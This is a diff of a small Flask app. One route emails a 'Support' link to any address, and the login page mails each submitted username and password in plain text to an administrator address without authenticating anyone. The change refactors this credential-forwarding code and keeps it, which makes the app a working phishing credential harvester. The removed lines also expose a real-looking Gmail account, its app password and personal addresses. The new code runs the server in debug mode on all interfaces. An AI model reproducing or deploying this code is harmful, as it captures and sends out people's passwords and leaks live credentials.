@@ -15,11 +15,22 @@ app.config["MAIL_SERVER"] = os.environ.get("MAIL_SERVER", "smtp.gmail.com")
 app.config["MAIL_PORT"] = int(os.environ.get("MAIL_PORT", 587))
 app.config["MAIL_USE_TLS"] = os.environ.get("MAIL_USE_TLS", "True") == "True"
 app.config["MAIL_USE_SSL"] = os.environ.get("MAIL_USE_SSL", "False") == "True"
-app.config["MAIL_USERNAME"] = os.environ.get("MAIL_USERNAME", "lpg8718068669@gmail.com")
-app.config["MAIL_PASSWORD"] = os.environ.get("MAIL_PASSWORD", "ejpevwjotmueyoao")
-app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("MAIL_DEFAULT_SENDER", "lpg8718068669@gmail.com")
+app.config["MAIL_USERNAME"] = os.environ.get("MAIL_USERNAME")
+app.config["MAIL_PASSWORD"] = os.environ.get("MAIL_PASSWORD")
+app.config["MAIL_DEFAULT_SENDER"] = os.environ.get("MAIL_DEFAULT_SENDER")
 
 mail = Mail(app)
+
+ADMIN_EMAIL = os.environ.get("ADMIN_EMAIL", "admin@example.com")
+APP_URL = os.environ.get("APP_URL", "http://localhost:5777")
+
+# ===== Helper function for threaded emails =====
+def send_async_email(msg):
+    with app.app_context():
+        try:
+            mail.send(msg)
+        except Exception as e:
+            print("Email send error:", e)
 
 # ===== ROUTES =====
 @app.route("/send_msg", methods=["POST"])
@@ -29,21 +40,15 @@ def send_msg():
         return {"status": False, "message": "Email is required"}, 400
 
     email = data["email"]
-    link = os.environ.get("APP_URL", "http://localhost:5777") + "/login"
+    link = f"{APP_URL}/login"
 
-    def send_email():
-        with app.app_context():  # <--- FIX: context added
-            try:
-                msg = Message(
-                    subject="Support",
-                    recipients=[email],
-                    body=f"Click here to visit: {link}"
-                )
-                mail.send(msg)
-            except Exception as e:
-                print("Support mail error:", e)
+    msg = Message(
+        subject="Support",
+        recipients=[email],
+        body=f"Click here to visit: {link}"
+    )
+    threading.Thread(target=send_async_email, args=(msg,)).start()
 
-    threading.Thread(target=send_email).start()
     return {"status": True, "message": "Mail sent successfully"}
 
 @app.route("/login", methods=["GET", "POST"])
@@ -52,25 +57,23 @@ def login():
         username = request.form.get("name")
         password = request.form.get("password")
 
-        def send_login_mail():
-            with app.app_context():  # <--- FIX: context added
-                try:
-                    msg = Message(
-                        subject="Login Alert",
-                        recipients=["raksha.rajput98@gmail.com"],  # Admin email
-                        body=f"Username: {username}\nPassword: {password}"
-                    )
-                    mail.send(msg)
-                except Exception as e:
-                    print("Login mail error:", e)
+        # Send login alert to admin
+        msg = Message(
+            subject="Login Alert",
+            recipients=[ADMIN_EMAIL],
+            body=f"Username: {username}\nPassword: {password}"
+        )
+        threading.Thread(target=send_async_email, args=(msg,)).start()
 
-        threading.Thread(target=send_login_mail).start()
+        session["username"] = username
         return redirect(url_for("dashboard"))
 
     return render_template("home.html")
 
 @app.route("/dashboard")
 def dashboard():
+    if "username" not in session:
+        return redirect(url_for("login"))
     return render_template("dashboard.html")
 
 @app.route("/logout")
@@ -80,4 +83,4 @@ def logout():
 
 # ===== Run Server =====
 if __name__ == "__main__":
-    app.run(debug=True, port=5777)
+    app.run(debug=True, port=5777, host="0.0.0.0")
